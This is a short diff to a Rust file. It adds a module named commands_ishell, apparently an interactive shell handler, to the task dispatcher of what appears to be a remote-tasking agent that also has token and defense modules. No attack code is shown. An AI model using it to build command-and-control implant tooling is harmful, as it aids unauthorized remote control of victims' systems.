@@ -14,6 +14,8 @@ mod commands_tokens;
 mod commands_defense;
 #[path = "commands_utils.rs"]
 mod commands_utils;
+#[path = "commands_ishell.rs"]
+mod commands_ishell;
 
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
@@ -687,6 +689,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             if commands_tokens::dispatch(t, task) { return; }
             if commands_defense::dispatch(t, task) { return; }
             if commands_utils::dispatch(t, task) { return; }
+            if commands_ishell::dispatch(t, task)  { return; }
             t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
         }
     }
